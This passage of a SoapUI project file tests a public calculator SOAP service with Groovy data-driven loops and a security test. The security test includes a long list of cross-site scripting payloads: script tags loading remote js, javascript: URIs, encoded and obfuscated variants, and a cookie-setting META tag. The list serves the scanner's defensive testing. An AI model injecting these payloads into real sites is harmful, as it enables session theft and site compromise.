	if(testStepSrc.getAssertionAt(count).getStatus().toString()!="VALID")
	status="Failed"
	log.info('Assertion:' +testStepSrc.getAssertionAt(count).getName()+'::' + testStepSrc.getAssertionAt(count).getStatus())
	error = testStepSrc.getAssertionAt(count).getErrors()
	if (error !=null)
	{
		actual = actual + "\r\n" + testStepSrc.getAssertionAt(count).getName()+":"+error[0].getMessage()
	}
}

WritableSheet sheet1 = copy.getSheet("Sheet1");
Label label = new Label(3,row,status);
sheet1.addCell(label);
label = new Label(4,row,actual);
sheet1.addCell(label);
copy.write();
copy.close();
workbook.close();

if (RowCount-1 > row)
{
testRunner.gotoStepByName("ReadExcel")
propTestStep.setPropertyValue("CurrentRow",++row.toString())
}
else
{
	propTestStep.setPropertyValue("CurrentRow","0")
}

</script></con:config></con:testStep><con:testStep type="request" id="a27340db-925c-46e3-ad47-d4d78a7ebba5" name="Divide - Request 1" disabled="true"><con:settings/><con:config xsi:type="con:RequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:interface>CalculatorSoap12</con:interface><con:operation>Divide</con:operation><con:request name="Divide - Request 1" outgoingWss="" incomingWss="" timeout="" sslKeystore="" useWsAddressing="false" useWsReliableMessaging="false" wssPasswordType="" id="ebb1b4c9-6b65-4465-bace-6d63f13229fd"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:encoding>UTF-8</con:encoding><con:endpoint>${#Project#My_Endpoint}</con:endpoint><con:request><![CDATA[<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
   <soap:Header/>
   <soap:Body>
      <tem:Divide>
         <tem:intA>46</tem:intA>
         <tem:intB>3</tem:intB>
      </tem:Divide>
   </soap:Body>
</soap:Envelope>]]></con:request><con:assertion type="SOAP Response" id="b4532c43-8473-442d-b9ba-d87af08a8d67" name="SOAP Response"/><con:credentials><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:wsaConfig mustUnderstand="NONE" version="200508" action="http://tempuri.org/CalculatorSoap/DivideRequest"/><con:wsrmConfig version="1.2"/></con:request></con:config></con:testStep><con:testStep type="groovy" name="Loop Nuwani" id="0a369628-9251-4417-aee8-a05da8187cb2" disabled="true"><con:settings/><con:config><script>import jxl.*;
def myTestCase = context.testCase
propTestStep = myTestCase.getTestStepByName("testdata_TC1")
Workbook excelRead = Workbook.getWorkbook(new File ("C:\\Users\\ndesilva\\Desktop\\NYL QA ASM\\API\\SDET\\SDET Test Data.xls"))
Sheet sheet1 = excelRead.getSheet("Sheet1");

def Totalrows = sheet1.getRows().toString()
propTestStep.setPropertyValue("RowCount",Totalrows)
def Rowcount = propTestStep.getPropertyValue("RowCount")
def CurrentRow = propTestStep.getPropertyValue("CurrentRow")

if (Rowcount-1>CurrentRow)
{
	propTestStep.setPropertyValue("CurrentRow",++CurrentRow.toString())
	testRunner.gotoStepByName("ReadExcel")
		
}
else

return "mm"

propTestStep.setPropertyValue("CurrentRow","1")
	



</script></con:config></con:testStep><con:properties/><con:securityTest id="474d5c11-9bd9-4e77-b148-2cebc634ae83" name="SecurityTest 1" failOnError="true"><con:settings/><con:testStepSecurityTest><con:testStepId>c52dd979-c53d-429b-87bd-17eca81ad2e5</con:testStepId><con:testStepSecurityScan type="BoundaryScan" name="Boundary Scan" id="f76be3a5-4f5c-4b81-9f85-16c037968c32" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="Add" parameterName="Request" xpath="${Add-Request1}" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityScan type="CrossSiteScriptingScan" name="Cross Site Scripting" id="e3707664-80e7-4032-8d76-3f4a691b8759" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:CrossSiteScriptingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameterExposureStrings>&lt;PLAINTEXT></con:parameterExposureStrings><con:parameterExposureStrings>';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->&lt;/SCRIPT>">'>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>'';!--"&lt;XSS>=&amp;{()}</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js>&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=JaVaScRiPt:alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG """>&lt;SCRIPT>alert("XSS")&lt;/SCRIPT>"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>]]></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav	ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")>";' > out</con:parameterExposureStrings><con:parameterExposureStrings>perl -e 'print "&lt;SCR\0IPT>alert(\"XSS\")&lt;/SCR\0IPT>";' > out</con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT/XSS SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT/SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;&lt;SCRIPT>alert("XSS");//&lt;&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js?&lt;B></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC=//ha.ckers.org/.j></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS')"</con:parameterExposureStrings><con:parameterExposureStrings>&lt;iframe src=http://soapui.org/scriptlet.html &lt;</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT>a=/XSS/alert(a.source)&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>\";alert('XSS');//</con:parameterExposureStrings><con:parameterExposureStrings>&lt;/TITLE>&lt;SCRIPT>alert("XSS");&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BODY ONLOAD=alert('XSS')></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG DYNSRC="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG LOWSRC="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BGSOUND SRC="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BR SIZE="&amp;{alert('XSS')}"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LAYER SRC="http://soapui.org/scriptlet.html">&lt;/LAYER></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;LINK REL="stylesheet" HREF="http://soapui.org/xss.css"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>@import'http://soapui.org/xss.css';&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="Link" Content="&lt;http://soapui.org/xss.css>; REL=stylesheet"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>BODY{-moz-binding:url("http://soapui.org/xssmoz.xml#xss")}&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;XSS STYLE="behavior: url(xss.htc);"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>li {list-style-image: url("javascript:alert('XSS')");}&lt;/STYLE>&lt;UL>&lt;LI>XSS</con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC='vbscript:msgbox("XSS")'></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="mocha:[code]"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="livescript:[code]"></con:parameterExposureStrings><con:parameterExposureStrings>ï¿½scriptï¿½alert(ï¿½XSSï¿½)ï¿½/scriptï¿½</con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IFRAME SRC="javascript:alert('XSS');">&lt;/IFRAME></con:parameterExposureStrings><con:parameterExposureStrings>&lt;FRAMESET>&lt;FRAME SRC="javascript:alert('XSS');">&lt;/FRAMESET></con:parameterExposureStrings><con:parameterExposureStrings>&lt;TABLE BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;TABLE>&lt;TD BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(javascript:alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="background-image: url(&amp;#1;javascript:alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;DIV STYLE="width: expression(alert('XSS'));"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>@im\port'\ja\vasc\ript:alert("XSS")';&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;XSS STYLE="xss:expression(alert('XSS'))"></con:parameterExposureStrings><con:parameterExposureStrings>exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("XSS"))'></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE TYPE="text/javascript">alert('XSS');&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE>.XSS{background-image:url("javascript:alert('XSS')");}&lt;/STYLE>&lt;A CLASS=XSS>&lt;/A></con:parameterExposureStrings><con:parameterExposureStrings>&lt;STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE></con:parameterExposureStrings><con:parameterExposureStrings>&lt;!--[if gte IE 4]>&lt;SCRIPT>alert('XSS');&lt;/SCRIPT>&lt;![endif]--></con:parameterExposureStrings><con:parameterExposureStrings>&lt;BASE HREF="javascript:alert('XSS');//"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;OBJECT TYPE="text/x-scriptlet" DATA="http://soapui.org/scriptlet.html">&lt;/OBJECT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>&lt;param name=url value=javascript:alert('XSS')>&lt;/OBJECT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;EMBED SRC="http://soapui.org/xss.swf" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings><con:parameterExposureStrings>&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always">&lt;/EMBED></con:parameterExposureStrings><con:parameterExposureStrings>a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);</con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]]]>><![CDATA[<![CDATA[cript:alert('XSS');">]]]]>><![CDATA[</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>]]></con:parameterExposureStrings><con:parameterExposureStrings><![CDATA[<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>]]></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT SRC="http://soapui.org/xss.jpg">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;? echo('&lt;SCR)';echo('IPT>alert("XSS")&lt;/SCRIPT>'); ?></con:parameterExposureStrings><con:parameterExposureStrings>&lt;IMG SRC="http://soapui.org/somecommand.php?somevariables=maliciouscode"></con:parameterExposureStrings><con:parameterExposureStrings>Redirect 302 /a.jpg http://soapui.org/admin.asp&amp;deleteuser</con:parameterExposureStrings><con:parameterExposureStrings>&lt;META HTTP-EQUIV="Set-Cookie" Content="USERID=&amp;lt;SCRIPT&amp;gt;alert('XSS')&amp;lt;/SCRIPT&amp;gt;"></con:parameterExposureStrings><con:parameterExposureStrings>&lt;HEAD>&lt;META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> &lt;/HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-</con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT =">" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">" '' SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT "a='>'" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=`>` SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT a=">'>" SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings><con:parameterExposureStrings>&lt;SCRIPT>document.write("&lt;SCRI");&lt;/SCRIPT>PT SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings></con:config><con:assertion type="CrosSiteScript" id="3f127b72-d6b5-4420-8525-91a4da87bd9a" name="Cross Site Scripting Detection"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan></con:testStepSecurityTest><con:properties/></con:securityTest></con:testCase><con:properties/></con:testSuite><con:properties><con:property><con:name>My_Endpoint</con:name><con:value>http://www.dneonline.com/calculator.asmx</con:value></con:property></con:properties><con:wssContainer/><con:oAuth2ProfileContainer/><con:oAuth1ProfileContainer/><con:sensitiveInformation/></con:soapui-project>